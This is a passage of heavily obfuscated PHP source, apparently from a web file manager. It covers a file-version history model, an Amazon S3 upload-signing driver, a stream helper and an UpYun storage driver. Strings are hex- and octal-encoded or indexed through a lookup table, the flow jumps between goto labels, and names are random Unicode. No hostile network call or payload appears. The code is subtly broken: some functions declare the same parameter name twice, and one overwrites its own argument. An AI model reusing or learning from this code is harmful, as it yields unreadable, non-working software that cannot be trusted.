($E[$b뿉[29]] == $b뿉[1875] && isset($E[$b뿉[421]][$b뿉[385]])) { $E[$b뿉[421]][$b뿉[385]] = $CÉ[$E[$b뿉[421]][$b뿉[385]]]; } $E[$b뿉[407]] = $CÉ[$E[$b뿉[385]]]; $E[$b뿉[1880]] = $CÉ[$E[$b뿉[1867]]]; if ($E[$b뿉[29]] == $b뿉[1618]) { $E[$b뿉[1880]] = $E[$b뿉[407]]; $E[$b뿉[1867]] = $E[$b뿉[1880]][$b뿉[385]]; $E[$b뿉[407]] = !1; $E[$b뿉[385]] = $b뿉[33]; } $E[$b뿉[1810]] = $dʤѻ[$E[$b뿉[1493]]]; } unset($E); goto D; b⇌Ő: } public function removeBySource($FƵ) { $CΙ = array($_SERVER[Ť][399] => $FƵ); $this->where($CΙ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\143\x65\137\150\x69\163\164\x6f\162\x79"; public function historyCount($Cق) { goto c䨾; c䨾: $b =& $_SERVER[Ť]; if (!$Cق) { return array(); } if (is_string($Cق) || is_int($Cق)) { $Cق = array($Cق); } goto b; eĨ: return array_to_keyvalue($b, $b[385], $b[1685]); goto E; b: $F = $b[1881]; $f = array($b[385] => array($b[7], $Cق)); $b = $this->field($F)->where($f)->group($b[385])->select(); goto eĨ; E: } public function addHistory($A, $Bг = '') { $C =& $_SERVER[Ť]; $eГ = array($C[399] => $A[$C[385]], $C[1485] => isset($A[$C[395]]) ? $A[$C[395]] : $A[$C[394]], $C[436] => $A[$C[435]], $C[537] => $A[$C[77]], $C[1882] => $Bг); $e󣩠 = $GLOBALS[$C[6]][$C[84]][$C[1073]]; if ($e󣩠 > 1) { $this->historyAutoClear($eГ[$C[385]]); $this->add($eГ); } Hook::trigger($C[1883], $eГ); Model($C[1884])->eventFileEdit($A[$C[385]]); } private function historyAutoClear($aۋ) { goto Aذ; d: $f² = $C׼ == $Dܬ[1095] ? 5 : $A戗; if ($A戗 <= 1) { $f² = 1; } if ($f² >= 500) { return; } goto F蜶; Aذ: $Dܬ =& $_SERVER[Ť]; $C׼ = Model($Dܬ[1093])->get($Dܬ[1094]); $A戗 = $GLOBALS[$Dܬ[6]][$Dܬ[84]][$Dܬ[1073]]; goto d; b׶: $cˏ = array_to_keyvalue($bĴ, $Dܬ[33], $Dܬ[383]); $cˏ = array_slice($cˏ, $f²); $f󩩄 = array_to_keyvalue($bĴ, $Dܬ[33], $Dܬ[435]); goto f; fŨ: $this->where($e􊣱)->delete(); Model($Dܬ[438])->remove($f󩩄); goto Fϣ; f: $f󩩄 = array_slice($f󩩄, $f²); if (!$cˏ || !$f󩩄) { return; } $e􊣱 = array($Dܬ[401] => array($Dܬ[7], $cˏ)); goto fŨ; F蜶: $e􊣱 = array($Dܬ[399] => $aۋ); $bĴ = $this->field($Dܬ[1885])->where($e􊣱)->order($Dܬ[1878])->select(); if (!$bĴ || $f² >= count($bĴ)) { return; } goto b׶; Fϣ: } public function listData($d) { goto a; cҎ軖: $fƊ = $this->field($E݆)->where($a椐)->order($eɢ[1878])->selectPage(); $this->_listAppendUser($fƊ[$eɢ[361]]); $Dι = Model($eɢ[1093])->get($eɢ[1094]); goto dڽ; a: $eɢ =& $_SERVER[Ť]; $a椐 = array($eɢ[399] => $d); $E݆ = $eɢ[1886]; goto cҎ軖; dڽ: $c󬆪۞ = 3; if ($Dι == $eɢ[1095]) { $fƊ[$eɢ[361]] = array_slice($fƊ[$eɢ[361]], 0, $c󬆪۞); $fƊ[$eɢ[358]] = array($eɢ[1887] => 1, $eɢ[1888] => 20, $eɢ[1889] => 1, $eɢ[1890] => count($fƊ[$eɢ[361]])); } return $fƊ; goto d̛; d̛: } protected function _listAppendUser(&$eǈÇ) { $F˞ =& $_SERVER[Ť]; $f = array_to_keyvalue($eǈÇ, $F˞[33], $F˞[1493]); $B훕 = Model($F˞[494])->userListInfo($f); foreach ($eǈÇ as &$F̴ކ) { $f = $F̴ކ[$F˞[1493]]; $F̴ކ[$F˞[394]] = $B훕[$f] ? $B훕[$f] : !1; } unset($F̴ކ); } public function fileInfo($c) { $c =& $_SERVER[Ť]; $cඛ = $this->tablePrefix; $bȫݪ = "{$cඛ}\151\x6f\x5f\x66\151\x6c\145\40\x66\x69\x6c\145\163\x20\157\x6e\40\146\x69\154\x65\163\x2e\146\151\154\145\111\x44\40\x3d\x20\150\x69\163\x74\157\162\x79\x2e\x66\x69\x6c\145\111\x44"; return $this->alias($c[1891])->where(array($c[401] => $c))->join($bȫݪ, $c[1892])->find(); } public function removeItem($AЭ) { $Eǝ =& $_SERVER[Ť]; $C仫 = array($Eǝ[401] => $AЭ); $Dđ = $this->where($C仫)->find(); if ($Dđ) { $Bག = $this->where($C仫)->delete(); Model($Eǝ[438])->remove($Dđ[$Eǝ[435]]); return $Bག; } return !1; } public function removeBySource($d߃) { goto d첕; EԘ: $c = array($a[399] => array($a[7], $d߃)); $a̭ = $this->field($a[436])->where($c)->select(); if ($a̭) { $this->where($c)->delete(); $bމ = array_to_keyvalue($a̭, $a[33], $a[435]); Model($a[438])->remove($bމ); } goto Cɖ; d첕: $a =& $_SERVER[Ť]; if (!$d߃) { return !1; } if (!is_array($d߃)) { $d߃ = array($d߃); } goto EԘ; Cɖ: return !0; goto d; d: } public function setDetail($C̆, $F) { $Bߵ豢 =& $_SERVER[Ť]; return $this->where(array($Bߵ豢[401] => $C̆))->save(array($Bߵ豢[1882] => $F)); } public function rollbackToItem($EՊ, $Aۢ) { goto Cʔ֬; B􄾉ӑ: return $this->where(array($AՓ´[401] => $Aۢ))->delete(); goto b; E坪: $A抪 = $this->find($Aۢ); $F䂅 = array($AՓ´[435] => $A抪[$AՓ´[435]], $AՓ´[77] => $A抪[$AՓ´[77]], $AՓ´[107] => time(), $AՓ´[395] => USER_ID); Model($AՓ´[768])->where(array($AՓ´[385] => $EՊ))->save($F䂅); goto B􄾉ӑ; Cʔ֬: $AՓ´ =& $_SERVER[Ť]; $F = Model($AՓ´[768])->sourceInfo($EՊ); $this->addHistory($F, LNG($AՓ´[1893])); goto E坪; b: } public function clearSame($e򊛦) { goto F藡; F藡: $d鈹 =& $_SERVER[Ť]; $DƋ˙ = $this->listData($e򊛦); $e = array_to_keyvalue_group($DƋ˙, $d鈹[435]); goto D򃖶; D򃖶: $FꈼӲ = array(); $BË = array(); foreach ($e as $A) { if (!$A || count($A) <= 1) { continue; } foreach ($A as $bć) { $FꈼӲ[] = $bć[$d鈹[435]]; $BË[] = $bć[$d鈹[383]]; } } goto Dءʡ; Dءʡ: if (!$BË) { return; } $this->where(array($d鈹[383] => array($d鈹[7], $BË)))->delete(); Model($d鈹[438])->remove($FꈼӲ); goto f; f: } public function userSpace() { $bȱ =& $_SERVER[Ť]; $B = $this->tablePrefix; $F֛ = array($bȱ[1485] => USER_ID); $dʆꦏ = "{$B}\151\157\137\146\x69\x6c\x65\40\146\151\154\145\163\x20\157\156\40\146\151\154\x65\163\56\x66\151\x6c\145\x49\104\x20\x3d\40\x68\x69\163\164\157\x72\x79\x2e\146\151\x6c\x65\x49\x44"; return $this->alias($bȱ[1891])->where($F֛)->join($dʆꦏ, $bȱ[1892])->sum($bȱ[77]); } } goto cⴏ; E񌺼: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($AҼ) { parent::__construct($AҼ); } public function uploadFormData($d͈ʫ, $eȺه = 3600) { goto c󷧨; bʹ: $bɕ = $Aŷ٦[1191]; $B = $eȺه . $Aŷ٦[33]; $E = $Aŷ٦[1155]; goto dë; dë: $dڳ = array($this->accessKey, $dҠȟ, $this->region, $fժ, $bɕ); $A = implode($Aŷ٦[8], $dڳ); $Dǥ = array($Aŷ٦[1157] => gmdate($Aŷ٦[1156], strtotime($Aŷ٦[1192])), $Aŷ٦[1158] => array(array($Aŷ٦[1160] => $this->bucket), array($Aŷ٦[1159] => $Eġ), array($Aŷ٦[1161], $Aŷ٦[1162], $Aŷ٦[33]), array($Aŷ٦[1161], $Aŷ٦[1193], $Aŷ٦[33]), array($Aŷ٦[1161], $Aŷ٦[1194], $Aŷ٦[33]), array($Aŷ٦[1163] => $E), array($Aŷ٦[1195] => $A), array($Aŷ٦[1196] => $Cȷ脹), array($Aŷ٦[1197] => $C֚ʡ), array($Aŷ٦[1198] => $B))); goto bе; Fއ: $D = array($Aŷ٦[207] => $Aŷ٦[33], $Aŷ٦[1201] => $Aŷ٦[33], $Aŷ٦[1159] => $Eġ, $Aŷ٦[1163] => $E, $Aŷ٦[1167] => $bԔ, $Aŷ٦[1202] => $A, $Aŷ٦[1203] => $Cȷ脹, $Aŷ٦[1204] => $C֚ʡ, $Aŷ٦[1205] => $B, $Aŷ٦[1206] => $F읃, $Aŷ٦[173] => $this->getHost()); return $D; goto Bګȷ; b: $FĚ = hash_hmac($Aŷ٦[1199], $fժ, $C, !0); $EƊ = hash_hmac($Aŷ٦[1199], $bɕ, $FĚ, !0); $F읃 = hash_hmac($Aŷ٦[1199], $bԔ, $EƊ); goto Fއ; c󷧨: $Aŷ٦ =& $_SERVER[Ť]; $Eġ = $Aŷ٦[189]; $Cȷ脹 = $Aŷ٦[1189]; goto F; F: $fժ = $Aŷ٦[59]; $C֚ʡ = gmdate($Aŷ٦[1190]); $dҠȟ = gmdate($Aŷ٦[700]); goto bʹ; bе: $bԔ = base64_encode(json_encode($Dǥ)); $a = hash_hmac($Aŷ٦[1199], $dҠȟ, $Aŷ٦[1200] . $this->secret, !0); $C = hash_hmac($Aŷ٦[1199], $this->region, $a, !0); goto b; Bګȷ: } public function multiUploadFormData($D戫, $Fݟ = 3600) { $E扞 =& $_SERVER[Ť]; $Aʾ = gmdate($E扞[1285]); $eϾ = array(); $E͚ = $this->client->getUploadId($this->bucket, $D戫, $eϾ); if (!$E͚) { return !1; } return array($E扞[217] => $E͚, $E扞[173] => $this->getHost() . $E扞[8] . $this->pathEncode($D戫), $E扞[218] => $Aʾ, $E扞[89] => $D戫); } public function multiUploadAuthData($b؝رٶ, $c = array()) { goto Aں̧; Aں̧: $E =& $_SERVER[Ť]; $cዤ = isset($c[$E[165]]) ? $c[$E[165]] : $E[33]; $e깅 = $c[$E[89]]; goto D掅; D掅: unset($c[$E[89]]); if (isset($c[$E[219]])) { return $this->listUploadParts($e깅, $c); } $f̼Ϝ = array(); goto Aƈ; E: if (strpos($cዤ, $E[221]) === 0) { if (isset($f̼Ϝ[$E[1287]])) { $c = $f̼Ϝ[$E[1287]]; } else { if (isset($C[$E[1287]])) { $c = $C[$E[1287]]; } else { $c = hash($E[1199], $E[33]); } } return array($E[228] => $C[$E[228]], $E[1287] => $c, $E[218] => $C[$E[1290]]); } return $C[$E[228]]; goto Dؙ; B: $cͫ = $E[222]; $A歌 = $E[8] . $this->pathEncode($e깅) . $cዤ; $C = $this->client->__getSignatureV4($f̼Ϝ, $Bڱ, $cͫ, $A歌); goto E; Aƈ: if (isset($c[$E[1286]])) { $f̼Ϝ[$E[1287]] = $c[$E[1286]]; } $B؆ = explode($E[175], $this->getHost()); $Bڱ = array($E[1288] => $B؆[1], $E[1289] => $E[33], $E[207] => $E[116], $E[1201] => $c[$E[77]]); goto B; Dؙ: } public function listUploadParts($A, $dŻ牍 = array()) { goto Aʡ; Aʡ: $e =& $_SERVER[Ť]; $eߝ = str_replace($e[229], $e[33], $dŻ牍[$e[165]]); $aϊ = $this->client->listParts($this->bucket, $A, $eߝ); goto B; AǑ: $Eצ .= $e[1294]; $Eհ = array(); $Bֻ = explode($e[175], $this->getHost()); goto CҢ; B: if (!$aϊ) { return !1; } $Eצ = $e[1291]; foreach ($aϊ as $fȏ) { $Eצ .= $e[1292] . "\74\120\x61\x72\x74\116\165\x6d\x62\x65\x72\76{$fȏ[$e[1247]]}\74\x2f\120\x61\x72\x74\x4e\165\x6d\x62\x65\x72\76\12" . "\x3c\105\124\141\147\76{$fȏ[$e[1248]]}\x3c\x2f\x45\x54\141\147\76\12" . $e[1293]; } goto AǑ; CҢ: $C = array($e[1288] => $Bֻ[1], $e[207] => $e[116], $e[1201] => strlen($Eצ)); $EŖ = $e[220]; $FǞ = $e[8] . $this->pathEncode($A) . $dŻ牍[$e[165]]; goto E; E: $Eқ = $this->client->__getSignatureV4($Eհ, $C, $EŖ, $FǞ, $Eצ); return array($e[228] => $Eқ[$e[228]], $e[218] => $Eқ[$e[1290]], $e[230] => $aϊ, $e[1287] => $Eқ[$e[1287]]); goto C寍ԃ; C寍ԃ: } public function link($D˙, $B = array()) { return parent::link($D˙, $B); } public function fileOut($e˾, $CƖӅ = false, $A = false, $Fۉؤȧ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ť][1295])) { return parent::fileOutServer($e˾, $CƖӅ, $A, $Fۉؤȧ); } parent::fileOut($e˾, $CƖӅ, $A, $Fۉؤȧ); } public function fileOutImage($dФϐ, $Eż߃ = 250) { if (strstr($this->endpoint, $_SERVER[Ť][1295])) { return parent::fileOutImageServer($dФϐ, $Eż߃); } parent::fileOutImage($dФϐ, $Eż߃); } public function fileOutLink($e) { $c =& $_SERVER[Ť]; if (substr($e, 0, 7) == $c[1170]) { $e = $c[1171] . substr($e, 7); } header($c[156] . $e); die; } public function getHost() { $b =& $_SERVER[Ť]; $DǞ = str_rtrim(parent::getHost(), $b[8] . $this->bucket); $DǞ = explode($b[175], $DǞ); return $DǞ[0] . $b[175] . $this->bucket . $b[91] . $DǞ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($B犫, $EΩ = 0) { parent::__construct(); $this->source = $B犫; $this->sourceSize = $EΩ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($a = false) { return $this->sourceSize; } public function getContent($E򗧥 = false) { return $this->fileSubstr($E򗧥, 0, $this->sourceSize); } public function fileSubstr($f = false, $A = 0, $Bڸ = 0) { if (!$Bڸ) { $Bڸ = $this->sourceSize; } $dՙ = $this->sourceSize - $A; if ($Bڸ >= $dՙ) { $Bڸ = $dՙ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $A, $Bڸ); } if ($this->sourceType == self::TYPE_FILE) { if ($Bڸ <= 0) { return $_SERVER[Ť][33]; } $c = ftell($this->source); fseek_64($this->source, $c + $A); $f脰 = @fread($this->source, $Bڸ); fseek_64($this->source, $c); return $f脰; } } public function hashMd5($Dԙ = false) { return md5($this->getContent()); } public static function hash($F, $F = 0) { $b㘍ˈ = new PathDriverStream($F, $F); return $b㘍ˈ->hashSimple($F); } public static function md5($Eǂӗ, $bŚ = 0) { $BǇ = new PathDriverStream($Eǂӗ, $bŚ); return $BǇ->hashMd5($Eǂӗ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\57\x2f\x76\x30\56\x61\160\x69\x2e\165\160\x79\x75\156\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ḁ) { parent::__construct(); $this->_init($Ḁ); } public function _init($cəª) { $D =& $_SERVER[Ť]; foreach ($cəª as $AŽ۟ => $C׻) { if (isset($this->{$AŽ۟})) { $this->{$AŽ۟} = $C׻; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($D[1296] . LNG($D[1228])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($F렏, $bނ = "\x47\x45\124") { $aӽǋ =& $_SERVER[Ť]; $c = gmdate($aӽǋ[1262]); $fީ = base64_encode(hash_hmac($aӽǋ[1297], "{$bނ}\46{$F렏}\x26{$c}", md5("{$this->userpass}"), !0)); $bچ = array("\x41\x75\x74\x68\157\x72\x69\172\141\164\x69\x6f\156\x3a\x55\x50\x59\125\x4e\40{$this->username}\x3a{$fީ}", "\x44\x61\164\145\72{$c}"); return $bچ; } public function ussRequest($b, $C = "\107\105\x54", $Aω = false, $e = false, $a = false) { goto F㫩ٯ; aώ: $b۸ = $this->ussHeaders($Bʼ, $C); if ($e) { $b۸ = array_merge($b۸, $e); } $fԟ = url_request($this->endpoint . $Bʼ, $C, $Aω, $b۸, $a); goto e; F㫩ٯ: $cш =& $_SERVER[Ť]; $b = trim($b, $cш[8]); $Bʼ = "\x2f{$this->bucket}\57{$b}"; goto aώ; e: if (!$fԟ) { return array($cш[1056] => !1, $cш[1058] => $cш[1298]); } if (strtolower($C) == $cш[188] || in_array($fԟ[$cш[1056]], array($cш[1155], $cш[1299]))) { $Aω = $fԟ[$cш[1300]]; } else { $Aω = json_decode($fԟ[$cш[1058]], !0); if (!$Aω) { $Aω = $fԟ[$cш[1058]]; } else { if (!$fԟ[$cш[699]] && isset($Aω[$cш[1301]])) { $Aω = $Aω[$cш[1301]]; } } } return array($cш[1056] => $fԟ[$cш[699]], $cш[1058] => $Aω); goto bڭ; bڭ: } public function mkfile($c跖ڭ, $dۆ = '', $B먼 = REPEAT_RENAME) { if ($this->setContent($c跖ڭ, $dۆ)) { return $this->getPathOuter($c跖ڭ); } return !1; } public function mkdir($b⯪, $f = REPEAT_SKIP) { $fǣ =& $_SERVER[Ť]; $eżҦ = trim($b⯪, $fǣ[8]); if ($this->_isFolder($eżҦ)) { return $this->getPathOuter($eżҦ); } $f = array($fǣ[1302]); $bНښ = $this->ussRequest($eżҦ, $fǣ[220], !1, $f); return $bНښ[$fǣ[1056]] ? $this->getPathOuter($eżҦ) : !1; } public function copyFile($fήӭʮ, $f) { $Fط҈ =& $_SERVER[Ť]; $A = array($Fط҈[1303] . "\57{$this->bucket}\57{$fήӭʮ}", $Fط҈[1304]); $f = $this->ussRequest($f, $Fط҈[222], !1, $A); return $f[$Fط҈[1056]] ? !0 : $this->getPathOuter($f); } public function moveFile($f뚷̝, $fɽ) { $aӒ =& $_SERVER[Ť]; $eʼ = array($aӒ[1305] . "\x2f{$this->bucket}\x2f{$f뚷̝}", $aӒ[1304]); $f⃡ = $this->ussRequest($fɽ, $aӒ[222], !1, $eʼ); return $f⃡[$aӒ[1056]] ? !0 : $this->getPathOuter($fɽ); } public function delFile($A͔ۓ) { $fŰ =& $_SERVER[Ť]; $fݲ = $this->ussRequest($A͔ۓ, $fŰ[1306]); return $fݲ[$fŰ[1056]] ? !0 : !1; } public function delFolder($cʞ) { goto B; A҄: return $D[$FÏ[1056]]; goto e; eޑ͚: foreach ($cΏ as $Cׅ) { $D = $this->ussRequest($Cׅ[$FÏ[28]], $FÏ[1306]); if (!$D[$FÏ[1056]]) { return !1; } } foreach ($DȐۋ as $C) { $D = $this->ussRequest($C, $FÏ[1306]); if (!$D[$FÏ[1056]]) { return !1; } } $D = $this->ussRequest($cʞ, $FÏ[1306]); goto A҄; FƳЄ: $DȐۋ = $cΏ = array(); $this->fileList($cʞ, $DȐۋ, $cΏ, !0); $this->listItemCache = !0; goto eޑ͚; B: $FÏ =& $_SERVER[Ť]; if (!$this->exist($cʞ)) { return !0; } $this->listItemCache = !1; goto FƳЄ; e: } public function rename($e, $b믙) { if ($this->isFile($e)) { $b믙 = get_path_father($e) . $b믙; return $this->moveFile($e, $b믙); } return $this->renameObject($e, $b믙); } public function fileInfo($C, $d = false, $F = array()) { goto EŰ߇; EŰ߇: $Eβ =& $_SERVER[Ť]; $AҼ = array($Eβ[28] => $this->pathThis($C), $Eβ[75] => $this->getPathOuter($Eβ[8] . $C), $Eβ[29] => $Eβ[171], $Eβ[77] => isset($F[$Eβ[77]]) ? $F[$Eβ[77]] : 0, $Eβ[165] => $this->ext($C)); if ($d) { return $AҼ; } goto e쾱; e쾱: $AҼ[$Eβ[190]] = $AҼ[$Eβ[107]] = 0; $AҼ[$Eβ[191]] = $AҼ[$Eβ[192]] = !0; if (empty($F)) { $F = $this->objectMeta($C); if (!$F) { return $AҼ; } } goto Dڳ; d݇: return $AҼ; goto dᾒ; Dڳ: $AҼ[$Eβ[190]] = intval($F[$Eβ[1307]]); $AҼ[$Eβ[107]] = intval($F[$Eβ[1308]]); $AҼ[$Eβ[77]] = $F[$Eβ[77]]; goto d݇; dᾒ: } public function folderInfo($f¥Ǖ, $dҽ캉 = false) { goto d䎴; d䎴: $céճ =& $_SERVER[Ť]; $E = array($céճ[28] => $this->pathThis($f¥Ǖ), $céճ[75] => $this->getPathOuter($céճ[8] . $f¥Ǖ), $céճ[29] => $céճ[76]); if ($dҽ캉) { return $E; } goto aê; aê: $E[$céճ[190]] = $E[$céճ[107]] = 0; $E[$céճ[191]] = $E[$céճ[192]] = !0; if (empty($fӥ)) { $fӥ = $this->objectMeta($f¥Ǖ); if (!$fӥ) { return $E; } } goto e͋; e͋: $E[$céճ[190]] = intval($fӥ[$céճ[1307]]); $E[$céճ[107]] = intval($fӥ[$céճ[1308]]); return $E; goto Cڌ; Cڌ: } private function listObjs($C㑍, $D = 0, $d㸢 = 1000) { $Cݯ =& $_SERVER[Ť]; $aΞߦ = array($Cݯ[1309], $Cݯ[1310] . $d㸢); if ($D) { $aΞߦ[] = $Cݯ[1311] . $D; } $Bƍކ = $this->ussRequest($C㑍, $Cݯ[224], !1, $aΞߦ); return !$Bƍކ[$Cݯ[1056]] ? !1 : $Bƍކ[$Cݯ[1058]]; } private function fileList($dŽ, &$B, &$Eܷٵ, $e騋 = false) { goto B奶; B奶: $d茸 =& $_SERVER[Ť]; $bʚ = $d茸[33]; $e = 1000; goto bݥݨ; bݥݨ: $Dښ = rtrim($dŽ, $d茸[8]) . $d茸[8]; $E֡ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $A = $this->listObjs($dŽ, $bʚ, $e); if (!$A) { return !1; } $bʚ = isset($A[$d茸[1312]]) ? $A[$d茸[1312]] : $d茸[33]; $A̓ = isset($A[$d茸[1313]]) ? $A[$d茸[1313]] : array(); foreach ($A̓ as $Bޓ) { $c = $Bޓ[$d茸[29]] == $d茸[76] ? !0 : !1; $Fܱؽ = ltrim($Dښ . $Bޓ[$d茸[28]], $d茸[8]) . ($c ? $d茸[8] : $d茸[33]); $D = array($d茸[28] => $Fܱؽ, $d茸[29] => $c ? $d茸[76] : $d茸[171], $d茸[77] => $Bޓ[$d茸[331]], $d茸[1308] => $Bޓ[$d茸[1314]]); if ($E֡) { $this->cacheMethod($d茸[195], $Fܱؽ, $c); $this->cacheMethod($d茸[196], $Fܱؽ, $D); } if ($c) { $B[] = $Fܱؽ; if ($e騋) { $this->fileList($Fܱؽ, $B, $Eܷٵ, $e騋); } continue; } $Eܷٵ[] = $D; } if (count($A̓) < $e) { break; } } goto Bɣ; Bɣ: if ($E֡) { $this->cacheMethod($d茸[195], $dŽ, !0); } goto B; B: } public function listPath($E, $Cҋ = false) { $BϺ =& $_SERVER[Ť]; $e = $f = array(); $this->fileList($E, $e, $f); foreach ($e as $cւ => $dѥ) { $e[$cւ] = $this->folderInfo($dѥ, $Cҋ); } foreach ($f as $cւ => $dѥ) { $f[$cւ] = $this->fileInfo($dѥ[$BϺ[28]], $Cҋ, $dѥ); } return array($BϺ[74] => $e, $BϺ[73] => $f); } public function has($c߭֎, $Bݸ = false, $Bµ = true) { goto Fڑ; c彩: $AԹ = 0; $e = 0; $E = rtrim($c߭֎, $A[8]) . $A[8]; goto Eˌ; Fڑ: $A =& $_SERVER[Ť]; $a = $A[33]; $BՎ = 500; goto c彩; Eˌ: while (!0) { check_abort(); $aݺָ = $this->listObjs($c߭֎, $a, $BՎ); if (!$aݺָ) { return !1; } $a = isset($aݺָ[$A[1312]]) ? $aݺָ[$A[1312]] : $A[33]; $F = isset($aݺָ[$A[1313]]) ? $aݺָ[$A[1313]] : array(); if (empty($F)) { break; } $e۝ = array_filter($F, function ($Fпⅱ) { $b٩܇ =& $_SERVER[Ť]; return $Fпⅱ[$b٩܇[29]] == $b٩܇[76]; }); $Aܖ = count($F); $e۝ = count($e۝); $bνɋ = $Aܖ - $e۝; if ($Bݸ) { $e += $e۝; $AԹ += $bνɋ; if ($Aܖ < $BՎ) { break; } continue; } if ($Bµ) { if ($bνɋ) { return !0; } } else { if ($e۝) { return !0; } } if ($Aܖ < $BՎ) { break; } } if ($Bݸ) { return array($A[199] => $AԹ, $A[200] => $e); } return !1; goto eǍ; eǍ: } public function listAll($Eڈ) { goto dǆ; dǆ: $e֡ =& $_SERVER[Ť]; $cۯ = $Aָΰ = array(); $this->fileList($Eڈ, $cۯ, $Aָΰ, !0); goto D; E: return $this->listAllFiles($Eڈ, array_keys($b), $b); goto A; D: $b = array(); foreach ($Aָΰ as $cé˄) { $b[$cé˄[$e֡[28]]] = $cé˄[$e֡[77]]; } foreach ($cۯ as $cé˄) { if (is_string($cé˄)) { $b[$cé˄] = 0; } } goto E; A: } public function canRead($Cڎ) { return $this->exist($Cڎ) ? !0 : !1; } public function canWrite($B͚) { return $this->exist($B͚) ? !0 : !1; } public function getContent($e) { return $this->fileSubstr($e, 0, -1); } public function setContent($b, $b = '') { $B̉ =& $_SERVER[Ť]; if (!$b) { $F = $this->ussRequest($b, $B̉[220]); return $F[$B̉[1056]]; } $Dτ = $this->tempFile($this->pathThis($b)); file_put_contents($Dτ, $b); if ($this->upload($b, $Dτ)) { $this->tempFileRemve($Dτ); return !0; } return !1; } public function fileSubstr($CŊ, $a, $cϾ) { $cȊ =& $_SERVER[Ť]; if (!($D = $this->link($CŊ))) { return !1; } $c = !1; if ($cϾ > 0) { $e҉ = $a + $cϾ - 1; $c = array($cȊ[1275] . $a . $cȊ[428] . $e҉); } $e = url_request($D, $cȊ[224], !1, $c); return $e[$cȊ[699]] ? $e[$cȊ[1058]] : !1; } public function upload($c֍, $b, $Fґ = false, $AǦ = REPEAT_REPLACE) { goto f۴; D: do { $A¥ = $E[$EોĽ[1321]]; fseek_64($Fٜ, $bł); $c = fread($Fٜ, $A¥); $Eٳ = 0; do { $Eٳ++; $E = $this->uploadPart($c֍, $E, $c); } while (!$E && $Eٳ < 3); if (!$E) { return !1; } $A = $E[$EોĽ[1320]]; $bł += $A¥; } while ($A != -1); fclose($Fٜ); $Dң = array($EોĽ[1322], $EોĽ[1323] . $E[$EોĽ[1324]], $EોĽ[1318]); goto D⽿; a庲Β: $A = $E[$EોĽ[1320]]; $Fٜ = fopen($b, $EોĽ[1224]); if (!$Fٜ) { return !1; } goto D; D⽿: $EÏ = $this->ussRequest($c֍, $EોĽ[222], !1, $Dң); return $EÏ[$EોĽ[1056]] ? $this->getPathOuter($Bǂ) : !1; goto A; f۴: $EોĽ =& $_SERVER[Ť]; $Bݬ = IO::size($b); if ($Bݬ <= 1024 * 1024 * 200) { $A˱ = array($EોĽ[1315] . $b); $EÏ = $this->ussRequest($c֍, $EોĽ[222], $A˱); return $EÏ[$EોĽ[1056]] ? $this->getPathOuter($c֍) : !1; } goto C݅ņي; b: if (!$EÏ[$EોĽ[1056]]) { return !1; } $E = $EÏ[$EોĽ[1058]]; $bł = 0; goto a庲Β; C݅ņي: $e = 1024 * 1024 * 10; $Dң = array($EોĽ[1316], $EોĽ[1317] . $Bݬ, $EોĽ[1318], $EોĽ[1319] . $e); $EÏ = $this->ussRequest($c֍, $EોĽ[222], !1, $Dң); goto b; A: } private function uploadPart($AϞ, $e苔, &$a) { $fʶ =& $_SERVER[Ť]; $E릗Ӑ = array($fʶ[1325], $fʶ[1323] . $e苔[$fʶ[1324]], $fʶ[1326] . $e苔[$fʶ[1320]], $fʶ[138] . $e苔[$fʶ[1321]]); $Bʹ = $this->ussRequest($AϞ, $fʶ[222], $a, $E릗Ӑ); return !$Bʹ[$fʶ[1056]] ? $Bʹ[$fʶ[1056]] : $Bʹ[$fʶ[1058]]; } public function uploadFormData($AםȞ, $b񤐊 = 3600) { return $this->uploadPolicy($AםȞ, $b񤐊); } public function multiUploadFormData($Eך, $bş = 3600) { $DɆۈ =& $_SERVER[Ť]; $cм = (int) $GLOBALS[$DɆۈ[7]][$DɆۈ[77]]; return $this->uploadPolicy($Eך, $bş, $cм); } private function uploadPolicy($a, $d = 3600, $dʞֻ = 0) { goto eý; dŒ: $Fү = base64_encode(hash_hmac($bθ[1297], "\x50\x4f\x53\124\46{$F˧}\46{$aƓ߄}\x26{$B۴↋}", md5("{$this->userpass}"), !0)); $E = array($bθ[1167] => $B۴↋, $bθ[1331] => "\125\x50\131\125\116\x20{$this->username}\x3a{$Fү}", $bθ[173] => $this->endpoint . $F˧); return $E; goto d; eý: $bθ =& $_SERVER[Ť]; $F˧ = $bθ[8] . $this->bucket; $aƓ߄ = gmdate($bθ[1262]); goto dܱ; dܱ: $E = array($bθ[1327] => $this->bucket, $bθ[1328] => $a, $bθ[1329] => time() + $d, $bθ[1330] => $aƓ߄); if ($dʞֻ) { $E[$bθ[1241]] = $dʞֻ; } $B۴↋ = base64_encode(json_encode($E)); goto dŒ; d: } public function download($Eʝ, $A׋) { goto c˅; c˅: $a㠓 = IO::getPathInner(IO::mkfile($A׋)); if (!($FĢ = $this->link($Eʝ))) { return !1; } $Eԇ֐ = 0; goto CӪ; D: fclose($F֛Ȕˠ); return $A׋; goto eޠ; CӪ: $eә = 1024 * 200; $F֛Ȕˠ = fopen($a㠓, $_SERVER[Ť][1281]); while (!0) { $E = $this->fileSubstr($Eʝ, $Eԇ֐, $eә); if ($E === !1) { return !1; } fwrite($F֛Ȕˠ, $E); $Eԇ֐ += $eә; if (strlen($E) < $eә) { break; } } goto D; eޠ: } public function link($aψ, $e = array()) { $E =& $_SERVER[Ť]; $aψ = trim($aψ, $E[8]); if (!empty($this->token)) { $B獡 = strtotime(date($E[1332])); $c = substr(md5($this->token . $E[278] . $B獡 . $E[1333] . $aψ), 12, 8) . $B獡; $e[] = $E[1334] . $c; } 